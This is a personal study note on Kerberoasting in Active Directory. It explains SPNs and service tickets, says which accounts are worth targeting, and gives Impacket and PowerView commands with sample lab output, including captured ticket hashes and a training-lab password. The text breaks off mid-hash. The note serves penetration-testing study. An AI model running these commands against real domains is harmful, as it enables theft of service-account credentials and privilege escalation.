---
created: 2026-07-29
updated: 2026-10-22
tags:
  - AD
  - AD_attacks
  - Kerberos
---
>[!note] [`T1558.003 — Steal or Forge Kerberos Tickets: Kerberoasting — MITRE ATT&CK`](https://attack.mitre.org/techniques/T1558/003/).

## Kerberoasting

- A **Service Principal Name (SPN)** uniquely identifies a service instance and maps it to the Active Directory account it runs as. 

>[!example]-
> - Suppose an SPN `MSSQLSvc/sql01.corp.local:1433` is registered on the account `svc_sql`. 
> - A client that wants to reach that SQL Server requests a ticket for the SPN, not for `svc_sql`; the KDC looks the SPN up in Active Directory, finds that it belongs to `svc_sql`, and encrypts the ticket with that account's long-term key.

- In Active Directory, any authenticated principal can request a **Service Ticket (ST)** for any registered SPN. 
- To request an ST, a principal must have a valid TGT (Ticket-Granting Ticket). The KDC doesn't check whether the user is authorized to use the service, only that the TGT is valid. 

>[!note] See [[Kerberos#`2.` TGS exchange (`KRB_TGS_REQ` / `KRB_TGS_REP`)]].

- The ST itself is encrypted with a long-term key of the account the service runs as. Because the long-term key is derived deterministically from the account's password, a captured ST can be taken offline and tested against candidate passwords until one decrypts it.

>[!important] Accounts without SPNs can't be Kerberoasted, because the KDC issues no service tickets for them.

>[!note] See [[Kerberos#SPNs]].

> **Kerberoasting** is an attack in which an authenticated domain user requests Kerberos **Service Tickets (STs)** for accounts registered with **Service Principal Names (SPNs)** and cracks the encrypted ticket payloads offline to recover the service accounts' passwords.

>[!note] Kerberoasting generates no failed logon events (`4625`) and therefore causes no account lockouts (same as [[AS-REP roasting]]), only event `4769`, *A Kerberos service ticket was requested*).

> [!important]+ Kerberoasting requires a valid authentication context within the domain — any account, even a low-privileged one. 
> - For authentication, you can use a password, an NTLM hash ([[Pass-the-Hash]]), or a Linux `keytab` file. 
> - An **anonymous** context won't work: the KDC won't issue tickets to an unauthenticated requester.

>[!interesting] The technique got its name — and its fame — from **Tim Medin's** talk *[`Attacking Kerberos: Kicking the Guard Dog of Hades`](https://www.youtube.com/watch?v=HHJWfG9b0-E)* (2014).

>[!note] Kerberoasting abuses the *legitimate, intended behavior* of the [[Kerberos]] protocol rather than any software vulnerability.

>[!note] See [[Kerberos]].
 
>[!note]+ Terminology
>- A common misnomer is calling the requested tickets "TGS tickets". In the Kerberos spec ([`RFC 4120`](https://www.rfc-editor.org/info/rfc4120)), **TGS** is the **Ticket-Granting Server** — a component of the Key Distribution Center. The tickets it issues are **Service Tickets (STs)**.

## Executing Kerberoasting

>[!important]+ Which accounts to target
> - **Computer accounts** (`COMPUTER$`) have 120-character randomly-generated passwords, rotated automatically every 30 days; even the fastest GPU rig won't crack one offline in any realistic timeframe — a dead end for roasting.
> - **Group Managed Service Accounts (gMSAs)** are the same story (240-character randomly-generated passwords, rotated automatically).
> - **User service accounts** (`svc_sql`, `svc_backup`, `dev_db`, etc.) are the real target: their passwords are chosen by humans, and humans pick weak passwords. Admins and vendors often attach SPNs to ordinary user accounts because full service accounts are fiddly to set up and can break on the automatic 30-day rotation, leaving a human-chosen (and often weak) password behind the SPN.
> - For privilege escalation rather than a foothold, target **high-value accounts** — those flagged `adminCount=1`, i.e. members of privileged groups like `Domain Admins`.

>[!info] `adminCount` is set when a user is added to a protected group and is **never automatically cleared**, so it marks both current *and* former privileged accounts. Former privileged accounts may still retain powerful rights.

### From Linux 

#### `GetUserSPNs.py`

- From a Linux host, use Impacket's [`GetUserSPNs.py`](https://github.com/fortra/impacket/blob/master/examples/GetUserSPNs.py).
- It authenticates to the domain as the account passed in the `domain/user` argument — any valid domain account — queries the DC over **LDAP** for accounts that have SPNs, sends the `TGS-REQ` requests, and prints the tickets in a format both Hashcat and John the Ripper can read. You're prompted for that account's password unless you supply `-hashes`, `-k`, or `-aesKey`.

>[!warning] Kerberos is time-sensitive. If your clock differs from the DC by more than five minutes (the default tolerance), requests fail with `KRB_AP_ERR_SKEW`. Sync to the DC first — e.g. `sudo ntpdate <DC_IP>` or `sudo rdate -n <DC_IP>` — or wrap a single command with `faketime`.

- Request tickets for all user accounts with SPNs:

```bash
GetUserSPNs.py -dc-ip 10.10.11.5 EXAMPLE.COM/svc_name -request -outputfile SPNS
```

>[!example]-
> ```bash
> GetUserSPNs.py -dc-ip 172.16.8.3 INLANEFREIGHT.LOCAL/hporter -request -outputfile SPNS
> ```
> 
> ```bash
> Impacket v0.14.0.dev0+20260407.172353.7fc084ad - Copyright Fortra, LLC and its affiliated companies 
> 
> Password:
> ServicePrincipalName                         Name          MemberOf  PasswordLastSet             LastLogon                   Delegation 
> -------------------------------------------  ------------  --------  --------------------------  --------------------------  ----------
> adfsconnect/azure01.inlanefreight.local      azureconnect            2022-06-01 14:32:56.506935  <never>                                
> backupjob/veam001.inlanefreight.local        backupjob               2022-06-01 14:33:00.038178  <never>                                
> MSSQLSvc/DB01.inlanefreight.local:1433       mssqlsvc                2022-06-01 14:32:31.178803  <never>                                
> MSSQLSvc/DEVTEST.inlanefreight.local:1433    sqltest                 2022-06-01 14:32:45.522556  <never>                                
> MSSQLSvc/QA001.inlanefreight.local:1433      sqlqa                   2022-06-01 14:32:49.256932  <never>                                
> MSSQLSvc/SQL-DEV01.inlanefreight.local:1433  sqldev                  2022-06-01 14:32:41.913173  <never>                                
> MSSQLSvc/SQL-WEB01.inlanefreight.local:1433  mssqladm                2022-06-01 14:32:52.897615  2026-10-10 10:49:07.119135             
> MSSQLSvc/SQL01.inlanefreight.local:1433      svc_sql                 2022-06-01 14:32:34.850677  <never>                                
> MSSQLSvc/SQL02.inlanefreight.local:1433      sqlprod                 2022-06-01 14:32:38.381946  <never>                                
> SAP/APP01.inlanefreight.local                sapsso                  2022-06-01 14:33:07.225672  <never>                                
> SAPsvc/SAP01.inlanefreight.local             sapvc                   2022-06-01 14:33:10.678799  <never>                                
> vmware/vc.inlanefreight.local                vmwarescvc              2022-06-01 14:33:03.600665  <never>                                
> 
> 
> 
> [-] CCache file is not found. Skipping...
> ```
>
> ```bash
> cat SPNS | grep backupjob
> $krb5tgs$23$*backupjob$INLANEFREIGHT.LOCAL$INLANEFREIGHT.LOCAL/backupjob*$309c9b686162b14b12e4ac4e2176fc83$ac145bb544680fa02e039cb49eb59f2d5fc4e65798a8b29484929856ddf1c78fb553a344f706a0f5205c8bbe2a30dab9bff560923ff6c4fb4f1448d7f356a857ad44d26941c4af744e15439d914c71eb02335994a9c4fabc986646abe20571176c8c9bf5738e636e69c4864df4a289af86e5e86690f7e87defd64daf780ade15469a750ca1bb528ce4b3e57ca7b358787d10da71800d4cc5d967677a8940da9b7047ad655ab19fc5d0338ddd1cf1e20053b55e7d01c26fe69c91cb12e577f997416a5ecbd260482fc7962a489481c22409c37601909bb5cb010b98ef3f64f6d79a625c35020b643fe35c9902b628a8a145c9a9dcd5e864dba02946cd79c140a36081132cb5b39ba757a2052dae5707144393ccd6109baa0b672230dd688dbfcb8e994da9d8205c85e2a2e8f6d34c4689d7635d46c7b12dc262d8c47c8d70b26a06835d3dee96fa97b37f6caaeabd052e424d64dde2f5b7a4aa5d0f00abeeeae7ce2c11c992afe587efa4e8296cf3cc568436dfafc13171851c9ba73248b4a466615d3c53dc76aed4c6fb6428c8a848ebb14a89250eb3f89118a59c23a2702a2d2707d2b2f1ea16ae9043515582c1787a42aae004b3381473bdc1910307ede1f97004eb93a9bff74447d9c10f4edf1716bbd973e0b689042d00e954a034cc03ffc282062e1e9792860f5ecc22378bd0a5f87c40889d7ca3f0f34410c568788f32659ec866380b100b9af13d09ab53615c89c25ea41d77c2047cfc2183f1296318d337537b73d1fbca6b602b3605f9266f8b8e524b2e1e241c9b0cf4810c3e4c1aa43b97bba4f3e0cab65a3c2a4db941d7e3eee33520dda810c56dfd1435d6223d3bb9bf182fd81b3d25500fa5925584da06f5a77d6051deebf8dbe8e1e0310b8e089daf210933fa5fa75353a07d15851cd8352270b56a56e6e4fbce2308f5b1f2fef3c707faa71d8cf37ef5f3d4c68e4b0c6725f8b2dc1ec60166ea4c74621ca5fff1d3792c9c53473e7eb4158b4c09ba9cc44bc79226d995e13cdbdeeb631f62ba91fb79b4818fb5cb3e17a48f5a291ea772c1bb6655616a67417e5ab03077976b6f7a6aafa330bc5e35328834fffa9173319abb8067e3d73be25eafd17a627fa8d954e3ac61bdbdc9c8e0b7cb71684697ab2405a205895ffdd58c1fcc0f8afddfc19a910c93b0cd9f12b14871e8e6650bb097cd389b6bc37fe36e2e6e5430550e61753fd19c106762827d57d7d1b6c0b57a0860229392db302e4f7e7e0147105eb333bae38692861c29ec732ebff026e7c64b6483650961543db7e4c4416df6162ee687e03fff3409aab92aa407a5257bac9da5f82cce7bf63727
> ```

- Request a ticket for one specific account:

```bash
GetUserSPNs.py -dc-ip 10.10.11.5 EXAMPLE.COM/svc_name -request-user sqldev
```

>[!example]-
> ```bash
> GetUserSPNs.py -dc-ip 10.129.205.35 INLANEFREIGHT.LOCAL/htb-student:'HTB_@cademy_stdnt!' -request-user adam.jones
> ```
> 
> ```bash
> Impacket v0.14.0.dev0+20260407.172353.7fc084ad - Copyright Fortra, LLC and its affiliated companies 
> 
> ServicePrincipalName            Name        MemberOf  PasswordLastSet             LastLogon  Delegation 
> ------------------------------  ----------  --------  --------------------------  ---------  ----------
> IIS_dev/inlanefreight.local:80  adam.jones            2023-03-30 10:49:38.760866  <never>               
> 
> 
> 
> [-] CCache file is not found. Skipping...
> $krb5tgs$23$*adam.jones$INLANEFREIGHT.LOCAL$INLANEFREIGHT.LOCAL/adam.jones*$69a5d43e889ec2698a1e24e7d649c014$fb2bb24a33f3b5d7026d25ee966d280bf13ebef178601e74146dd94e57150abd3caf5c4743f0120b32ee37df08c4e01f4f07e4b26e84b9a31198d42b52e7bdb3abb0e1019b53dfeae0678f1bc115f79a8ad12a44af05cc236fd6d92a15c8cfe78bb1abcdc4fa03b9b71fa96aa60a392b1a329c118adfa2ab3c9e038e477c37010671ef50199b9824ecab182075753a431d1ae0962a893aee3f97ce8d881b33142115dfd70ac2ac1eacc4f6fef58283f4df155d62ceb7fba4a4d0d5bcece26609883528b63f301b7f7679783b13459ed0cd637bd156189e6a1e498ce4e64af14c57457a9f22ea54b7ad60f3df8efa805254aaff0f0d3a3bcc13fbe8fc1fb6aa389a3949d3100d11a6d5261d595bcc548460519ab15bc3610b118245e2089369fbe0e4e7f9b3a07cf9be4b39c4a0bdd349394a6063bbe931d411d048f87a728e13cfaeaa7a3fbd62b3020256201db3d3755517181c21b85baffc0457c46125355eb6f7ee00f3a55a0851b89a2bd876958fb853a4dcf33b93af664eeafc47c3ad60c0f0321da9a20d6333c2d2ea7484dc9dccac8b8f2405f564beb48fbaded2ce40d706911d798d20881ce6cced9d0767051be8770e250aadbfd24399b903522ba93504f6c126193609679c68fe14b436b19a9a069a860c0ae370d39e22b061206e4ae2eeb20293caeb6ea48e628c8218bc0804b07871ed0c1c97feeb073b512ce05169d4196af96b4d2ec8ecb8ed240e37f2d72c64c79bc7e2a9757780a37076d92102f9bad2354bd1bea8d3862e7f0192be575f4b66b5ff40371ad141bdcfe6a7bb94b97d585bea46a9e21c3be933624fe2ea6aa703e99b4741bd3daa4beeed123f533eab886cd72b5cba4484ac9c98719eef0488a4baae3e49e81307191b05134b3cf08dfd830e5798dc2b544ca64e32297422ab59ca7f757ac8998ea23c4975c37fc2c1cc06d72e09071ad6e866c55c9e3632f31505f6598731a8fd36a94d897719c206ff728524bffcc01f993cbb42a730ea9c9829abb2aaed48513e9cbff73bce0fe9cd51dcaf4135b2913d43edb232567173bf47addc81e09669025b92ec9672e2e399001f10e438be02d027e6015189c59f5dc15c7d12f2d5e37a922581091428340d3b4b256e209948b1f3e279d3973f017eccad4861810ba51595b3294e502d267781d5d3032094d266596661d3cb8bd4833f5f0c178cade5d639c26352721b26b5cf191ba4a5963a0d660c519469edd51b56d3f35353820ec76818382632e7139dc618c82c7c7a13e17a92022ed92f8ff9931761d798cc9dac2bad89e9f18c896a2812c0473c0ff91f0d9cd95d66393b51a5d429d356d6a645de191d7944d290f069319f335243b860fe01eac7fd034c3e7351c5cf37c2719b4d50e08d6fe82d73cdb2ed1547df0d2f0876117ad60f8ddcc9e58ec68e195503c9730aec478901aade5d8161f8f09034ccc77f1173acfad66fe34233b8dabc55c90465dfcacd6b07f410aa51eb3698a796e63dd404d2f2ad2f81ac42ba1640cfb3effc5d4514a60e8f0a84e757b4e2ca74fe
> ```

>[!note] You will be prompted for a password (for your current account), unless `-hashes` or `-k`  is used.

- Use NTLM hash instead of a password:

```bash
GetUserSPNs.py -dc-ip 10.10.11.5 EXAMPLE.COM/svc_name -hashes :31d6cfe0d16ae931b73c59d7e0c089c0 -request
```

- Use an existing Kerberos ticket cache:

```bash
export KRB5CCNAME=/path/to/ticket.ccache
GetUserSPNs.py -k -no-pass -dc-ip 10.10.11.5 EXAMPLE.COM/svc_name -request
```

| Option           | Description                                                              |
| ---------------- | ------------------------------------------------------------------------ |
| `-dc-ip`         | Set the Domain Controller (KDC) IP address.                              |
| `-dc-host`       | Set the Domain Controller hostname (use when NTLM is blocked).           |
| `-target-domain` | Query and roast a different domain across a trust (cross-domain).        |
| `-usersfile`     | Read target usernames or SPNs from a file, one per line.                 |
| `-request`       | Request STs for the matching accounts and output Hashcat/JtR hashes.     |
| `-request-user`  | Request an ST only for the named user's SPN (username only, no domain).  |
| `-outputfile`    | Write the output hashes to a file (implies `-request`).                  |
| `-hashes`        | Authenticate with an `LMHASH:NTHASH` ([[Pass-the-Hash]]).                |
| `-k` / `-no-pass`| Authenticate with a Kerberos ticket from the `ccache`.                   |
| `-aesKey`        | Authenticate with a Kerberos AES key (128/256-bit).                      |
| `-stealth`       | Drop the SPN filter from the LDAP query to blend in.                     |
| `-no-rc4`        | Request the account's configured etypes instead of forcing RC4.          |

### From Windows

- Enumerate accounts with SPNs first, then request their Service Tickets.

#### Enumerating accounts with SPNs

- The built-in [`setspn.exe`](https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/setspn) queries Active Directory for registered SPNs:

```cmd
setspn.exe -Q */*
```

>[!example]-
> ```powershell
> PS C:\Tools> setspn.exe -Q */*
> ```
> 
> ```powershell
> Checking domain DC=INLANEFREIGHT,DC=LOCAL
> CN=ACADEMY-EA-DC01,OU=Domain Controllers,DC=INLANEFREIGHT,DC=LOCAL
>         exchangeAB/ACADEMY-EA-DC01
>         exchangeAB/ACADEMY-EA-DC01.INLANEFREIGHT.LOCAL
>         TERMSRV/ACADEMY-EA-DC01
>         TERMSRV/ACADEMY-EA-DC01.INLANEFREIGHT.LOCAL
>         Dfsr-12F9A27C-BF97-4787-9364-D31B6C55EB04/ACADEMY-EA-DC01.INLANEFREIGHT.LOCAL
>         ldap/ACADEMY-EA-DC01.INLANEFREIGHT.LOCAL/ForestDnsZones.INLANEFREIGHT.LOCAL
>         ldap/ACADEMY-EA-DC01.INLANEFREIGHT.LOCAL/DomainDnsZones.INLANEFREIGHT.LOCAL
>         DNS/ACADEMY-EA-DC01.INLANEFREIGHT.LOCAL
>         GC/ACADEMY-EA-DC01.INLANEFREIGHT.LOCAL/INLANEFREIGHT.LOCAL
>         RestrictedKrbHost/ACADEMY-EA-DC01.INLANEFREIGHT.LOCAL
>         RestrictedKrbHost/ACADEMY-EA-DC01
>         RPC/dfca7c4d-e949-4ef8-bb02-8cd0fe2e13f8._msdcs.INLANEFREIGHT.LOCAL
>         HOST/ACADEMY-EA-DC01/INLANEFREIGHT
>         HOST/ACADEMY-EA-DC01.INLANEFREIGHT.LOCAL/INLANEFREIGHT
>         HOST/ACADEMY-EA-DC01
>         HOST/ACADEMY-EA-DC01.INLANEFREIGHT.LOCAL
>         HOST/ACADEMY-EA-DC01.INLANEFREIGHT.LOCAL/INLANEFREIGHT.LOCAL
>         E3514235-4B06-11D1-AB04-00C04FC2DCD2/dfca7c4d-e949-4ef8-bb02-8cd0fe2e13f8/INLANEFREIGHT.LOCAL
>         ldap/ACADEMY-EA-DC01/INLANEFREIGHT
>         ldap/dfca7c4d-e949-4ef8-bb02-8cd0fe2e13f8._msdcs.INLANEFREIGHT.LOCAL
>         ldap/ACADEMY-EA-DC01.INLANEFREIGHT.LOCAL/INLANEFREIGHT
>         ldap/ACADEMY-EA-DC01
>         ldap/ACADEMY-EA-DC01.INLANEFREIGHT.LOCAL
>         ldap/ACADEMY-EA-DC01.INLANEFREIGHT.LOCAL/INLANEFREIGHT.LOCAL
> CN=krbtgt,CN=Users,DC=INLANEFREIGHT,DC=LOCAL
>         kadmin/changepw
> CN=ACADEMY-EA-MS01,OU=Web Servers,OU=Servers,OU=Computers,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL
>         WSMAN/ACADEMY-EA-MS01
>         WSMAN/ACADEMY-EA-MS01.INLANEFREIGHT.LOCAL
>         TERMSRV/ACADEMY-EA-MS01
>         TERMSRV/ACADEMY-EA-MS01.INLANEFREIGHT.LOCAL
>         tapinego/ACADEMY-EA-MS01
>         tapinego/ACADEMY-EA-MS01.INLANEFREIGHT.LOCAL
>         RestrictedKrbHost/ACADEMY-EA-MS01
>         HOST/ACADEMY-EA-MS01
>         RestrictedKrbHost/ACADEMY-EA-MS01.INLANEFREIGHT.LOCAL
>         HOST/ACADEMY-EA-MS01.INLANEFREIGHT.LOCAL
> CN=Dana Amundsen,OU=DevOps,OU=IT,OU=HQ-NYC,OU=Employees,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL
>         MSSQLSvc/ACADEMY-EA-DB01.INLANEFREIGHT.LOCAL:1433
>         MSSQL/ACADEMY-EA-FILE
> CN=ACADEMY-EA-MX01,OU=Mail,OU=Servers,OU=Computers,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL
>         IMAP/ACADEMY-EA-MX01
>         IMAP/ACADEMY-EA-MX01.INLANEFREIGHT.LOCAL
>         IMAP4/ACADEMY-EA-MX01
>         IMAP4/ACADEMY-EA-MX01.INLANEFREIGHT.LOCAL
>         POP/ACADEMY-EA-MX01
>         POP/ACADEMY-EA-MX01.INLANEFREIGHT.LOCAL
>         POP3/ACADEMY-EA-MX01
>         POP3/ACADEMY-EA-MX01.INLANEFREIGHT.LOCAL
>         exchangeRFR/ACADEMY-EA-MX01
>         exchangeRFR/ACADEMY-EA-MX01.INLANEFREIGHT.LOCAL
>         exchangeAB/ACADEMY-EA-MX01
>         exchangeAB/ACADEMY-EA-MX01.INLANEFREIGHT.LOCAL
>         exchangeMDB/ACADEMY-EA-MX01
>         exchangeMDB/ACADEMY-EA-MX01.INLANEFREIGHT.LOCAL
>         SMTP/ACADEMY-EA-MX01
>         SMTP/ACADEMY-EA-MX01.INLANEFREIGHT.LOCAL
>         SmtpSvc/ACADEMY-EA-MX01
>         SmtpSvc/ACADEMY-EA-MX01.INLANEFREIGHT.LOCAL
>         WSMAN/ACADEMY-EA-MX01
>         WSMAN/ACADEMY-EA-MX01.INLANEFREIGHT.LOCAL
>         TERMSRV/ACADEMY-EA-MX01
>         TERMSRV/ACADEMY-EA-MX01.INLANEFREIGHT.LOCAL
>         RestrictedKrbHost/ACADEMY-EA-MX01
>         HOST/ACADEMY-EA-MX01
>         RestrictedKrbHost/ACADEMY-EA-MX01.INLANEFREIGHT.LOCAL
>         HOST/ACADEMY-EA-MX01.INLANEFREIGHT.LOCAL
> CN=BACKUPAGENT,OU=Service Accounts,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL
>         backupjob/veam001.inlanefreight.local
> CN=SOLARWINDSMONITOR,OU=Service Accounts,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL
>         sts/inlanefreight.local
> CN=ACADEMY-EA-WS01,CN=Computers,DC=INLANEFREIGHT,DC=LOCAL
>         TERMSRV/ACADEMY-EA-WS01
>         TERMSRV/ACADEMY-EA-WS01.INLANEFREIGHT.LOCAL
>         RestrictedKrbHost/ACADEMY-EA-WS01
>         HOST/ACADEMY-EA-WS01
>         RestrictedKrbHost/ACADEMY-EA-WS01.INLANEFREIGHT.LOCAL
>         HOST/ACADEMY-EA-WS01.INLANEFREIGHT.LOCAL
> CN=ACADEMY-EA-CTX1,CN=Computers,DC=INLANEFREIGHT,DC=LOCAL
>         WSMAN/ACADEMY-EA-CTX1
>         WSMAN/ACADEMY-EA-CTX1.INLANEFREIGHT.LOCAL
>         RestrictedKrbHost/ACADEMY-EA-CTX1
>         HOST/ACADEMY-EA-CTX1
>         RestrictedKrbHost/ACADEMY-EA-CTX1.INLANEFREIGHT.LOCAL
>         HOST/ACADEMY-EA-CTX1.INLANEFREIGHT.LOCAL
> CN=sqlprod,OU=Service Accounts,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL
>         MSSQLSvc/SPSJDB.inlanefreight.local:1433
> CN=sqlqa,OU=Service Accounts,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL
>         MSSQLSvc/SQL-CL01-01inlanefreight.local:49351
> CN=sqldev,OU=Service Accounts,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL
>         MSSQLSvc/DEV-PRE-SQL.inlanefreight.local:1433
> CN=adfs,OU=Service Accounts,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL
>         adfsconnect/azure01.inlanefreight.local
> CN=testspn,CN=Users,DC=INLANEFREIGHT,DC=LOCAL
>         testspn/kerberoast.inlanefreight.local
> CN=testspn2,CN=Users,DC=INLANEFREIGHT,DC=LOCAL
>         testspn2/kerberoast.inlanefreight.local
> CN=ACADEMY-EA-FILE,OU=File Servers,OU=Servers,OU=Computers,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL
>         WSMAN/ACADEMY-EA-FILE
>         WSMAN/ACADEMY-EA-FILE.INLANEFREIGHT.LOCAL
>         TERMSRV/ACADEMY-EA-FILE
>         TERMSRV/ACADEMY-EA-FILE.INLANEFREIGHT.LOCAL
>         RestrictedKrbHost/ACADEMY-EA-FILE
>         HOST/ACADEMY-EA-FILE
>         RestrictedKrbHost/ACADEMY-EA-FILE.INLANEFREIGHT.LOCAL
>         HOST/ACADEMY-EA-FILE.INLANEFREIGHT.LOCAL
> CN=ACADEMY-EA-DB01,OU=Database,OU=Servers,OU=Computers,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL
>         tapinego/ACADEMY-EA-DB01
>         tapinego/ACADEMY-EA-DB01.INLANEFREIGHT.LOCAL
>         WSMAN/ACADEMY-EA-DB01
>         WSMAN/ACADEMY-EA-DB01.INLANEFREIGHT.LOCAL
>         RestrictedKrbHost/ACADEMY-EA-DB01
>         HOST/ACADEMY-EA-DB01
>         RestrictedKrbHost/ACADEMY-EA-DB01.INLANEFREIGHT.LOCAL
>         HOST/ACADEMY-EA-DB01.INLANEFREIGHT.LOCAL
> CN=ACADEMY-EA-CA01,OU=PKI,OU=Servers,OU=Computers,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL
>         tapinego/ACADEMY-EA-CA01
>         tapinego/ACADEMY-EA-CA01.INLANEFREIGHT.LOCAL
>         WSMAN/ACADEMY-EA-CA01
>         WSMAN/ACADEMY-EA-CA01.INLANEFREIGHT.LOCAL
>         RestrictedKrbHost/ACADEMY-EA-CA01
>         HOST/ACADEMY-EA-CA01
>         RestrictedKrbHost/ACADEMY-EA-CA01.INLANEFREIGHT.LOCAL
>         HOST/ACADEMY-EA-CA01.INLANEFREIGHT.LOCAL
> CN=certsvc,CN=Users,DC=INLANEFREIGHT,DC=LOCAL
>         http://ACADEMY-EA-CA01.INLANEFREIGHT.LOCAL
> CN=svc_vmwaresso,CN=Users,DC=INLANEFREIGHT,DC=LOCAL
>         vmware/inlanefreight.local
> CN=SAPService,CN=Users,DC=INLANEFREIGHT,DC=LOCAL
>         SAPService/srv01.inlanefreight.local
> 
> Existing SPN found!
> ```

- Scope the query to a specific domain:

```cmd
setspn.exe -T EXAMPLE.COM -Q */*
```

> [!note]- Option breakdown
> - `-Q */*`: wildcard query: every service class / hostname registered as an SPN in AD.
> - `-T`: target a specific realm (relevant in multi-domain forests).


- Search for users with SPNs using [`Get-ADUser`](https://learn.microsoft.com/en-us/powershell/module/activedirectory/get-aduser?view=windowsserver2025-ps) from the `ActiveDirectory` PowerShell module:

```powershell
Get-ADUser -LDAPFilter '(servicePrincipalName=*)' -Properties ServicePrincipalName | Select-Object Name, DistinguishedName, ServicePrincipalName
```

- Using [`Get-DomainUser`](https://powersploit.readthedocs.io/en/latest/Recon/Get-DomainUser/) (`PowerView`):

```powershell
Import-Module .\PowerView
```
```powershell
Get-DomainUser -SPN | Select-Object samaccountname, serviceprincipalname
```

>[!example]-
> ```powershell
> Get-DomainUser * -SPN | Select-Object samaccountname, serviceprincipalname
> ```
> 
> ```powershell
> 
> samaccountname serviceprincipalname                       
> -------------- --------------------                       
> azureconnect   adfsconnect/azure01.inlanefreight.local    
> backupjob      backupjob/veam001.inlanefreight.local      
> krbtgt         kadmin/changepw                            
> sqltest        MSSQLSvc/DEVTEST.inlanefreight.local:1433  
> sqlqa          MSSQLSvc/QA001.inlanefreight.local:1433    
> sqldev         MSSQLSvc/SQL-DEV01.inlanefreight.local:1433
> svc_sql        MSSQLSvc/SQL01.inlanefreight.local:1433    
> sqlprod        MSSQLSvc/SQL02.inlanefreight.local:1433   
> ```

- An LDAP search for users with SPNs:

```ldap
&(objectCategory=person)(objectClass=user)(servicePrincipalName=*)
```

- Run an LDAP query using PowerShell:

```powershell
$search = [adsisearcher]'(&(objectCategory=person)(objectClass=user)(servicePrincipalName=*))'
$search.PageSize = 1000

$search.FindAll() | ForEach-Object {
    $p = $_.Properties

    "`nUser: $($p['name'][0])"
    "DN:   $($p['distinguishedname'][0])"
    "SPNs:"
    $p['serviceprincipalname']
}
```

#### `PowerView`

- [`PowerView`](https://github.com/PowerShellMafia/PowerSploit/blob/master/Recon/PowerView.ps1) ships with a coupe of cmdlets useful for Kerberoasting: [`Get-DomainUser`](https://powersploit.readthedocs.io/en/latest/Recon/Get-DomainUser/) can be used to enumerate usres with SPNs, and [`Get-DomainSPNTicket`](https://powersploit.readthedocs.io/en/latest/Recon/Get-DomainSPNTicket/) can be used to request Service Tickets for those accounts.

---

- Enumerate users with SPNs:

```powershell
Import-Module .\PowerView.ps1
```
```powershell
Get-DomainUser * -SPN | Select-Object samaccountname,serviceprincipalname
```

>[!example]-
> ```powershell
> PS C:\Users\htb-student> Get-DomainUser * -SPN | Select-Object samaccountname,serviceprincipalname
> ```
> 
> ```powershell
> samaccountname serviceprincipalname
> -------------- --------------------
> krbtgt         kadmin/changepw
> sqldev         MSSQL_svc_dev/inlanefreight.local:1433
> sqlprod        MSSQLSvc/SQL01:1433
> sqlqa          MSSQL_svc_qa/inlanefreight.local:1433
> sql-test       MSSQL_svc_test/inlanefreight.local:1433
> adam.jones     IIS_dev/inlanefreight.local:80
> jacob.kelly    SVC/FILER02.inlanefreight.local
> ```

- Enumerate users with SPNs and request Service Tickets for these accounts (tickets are printed into the console):


```powershell
Get-DomainUser * -SPN | Get-DomainSPNTicket -format Hashcat | export-csv .\tgs.csv -notypeinformation
```

- Request a ticket for a specific account:

```powershell
Get-DomainUser -Identity sql_svc | Get-DomainSPNTicket -Format Hashcat
```

- Save the results into CSV:

```powershell
Get-DomainUser -Identity svc_sql | Get-DomainSPNTicket -format Hashcat | export-csv .\tgs.csv -notypeinformation
```

>[!example]-
> ```powershell
> Get-DomainUser -Identity jakob.kelly | Get-DomainSPNTicket -format Hashcat | export-csv .\tgs.csv -notypeinformation
> ```
> ```bash
> cat tgs.csv
> ```
> 
> ```bash
> "SamAccountName","DistinguishedName","ServicePrincipalName","TicketByteHexStream","Hash"
> "jacob.kelly","CN=jacob.kelly,CN=Users,DC=INLANEFREIGHT,DC=LOCAL","SVC/FILER02.inlanefreight.local",,"$krb5tgs$23$*jacob.kelly$INLANEFREIGHT.LOCAL$SVC/FILER02.inlanefreight.local*$2C180307643FB22050DDA985CC2B6279$2B9D7F6080B0ABDCBCFDEB2992E3C54EC6B10E36CD8B377871DEED43FE192B7DABB7FEE3C510E01301C7509F8C7B78BC1606CD92C0ACFFAE0C4BBC134E8B9812E28B4770F49E9C7B3E2230837B244118CFDC1E3B17D31E289E70ED02A6E8D346F160475ED778BC986C029967070312DEC6B0C02911624992BC7EB5210CEBD74847BEF6AA20E2CD370FB26A8BFA2E02BC63DC73F8DE7D6676287B3CC96CD138CAD2636A9C379B3C18E313E10F7A1475A93F23B6CC30CF25E66C8997A92C5B8364C385CBEAE78EEE5867FD6142FE070D6B959FFE1D09A21952860795CA6AE763E865E249FFCC4067D1A638C1D8C744136D0C9A8E2984C6F15E4164BF39997716368FB14CC4D8F5DCBEF011D3B9AA5B15C8CC8E57CEED94EA730DCC7DA8613CD70344882F56168860E3AA8CD5689CDEF46B81231904B95567CB460C75F2BD9B0E6009612EB70FD389892F5510117F56673277130C958520FB696FCAC2DDB18D5597B59D2CBCFA9F019C42ED0CD20C0DA219436EC0206C646AE22090B9E4AA4C61B6365D3E57B1537EB893D9A3D269E3EC5851E98158941D31FFCB3770FCDBC3D9519351794C5C57B3C07E46F50441B75C971EB5B31777503C3083727370E3EBB05022C7384CACE6997EDA4918AC7775B8E1FF481385059AC38B2DF0A8BB5F5DAFDF4E632322F5E06CEFD92FE3E5A21F19C7CA5BC8BB3FD43B098956C2F0BE1718242A4FCB5F24323DAD7B2556FD5C787498A9EDEAC7D2D23B7AF44B45A97FDE5E8807E5E8CED8D37D90AE71DD0B5565991123A1AAC6967E54E78CA6F56D8C1BBE8F65CA9D1D165C39583CFCDA1EEBF05489C1D73318E765DF2D7DD303537E22D093E8150304457CC59FF025FCCF402B5F936A54D158E072641A6D45BE22DC0DBCF9FB4A9B8D1F386BBBA264272B90033C81EAAC0425B9C6FAC63C52D2DF059DACAA3683AE0B88FEEDB67D13DDC125EC08BD12ED3273686C64706DEE2CB60BE70C6E3E305C90821AB12811295693427146B56E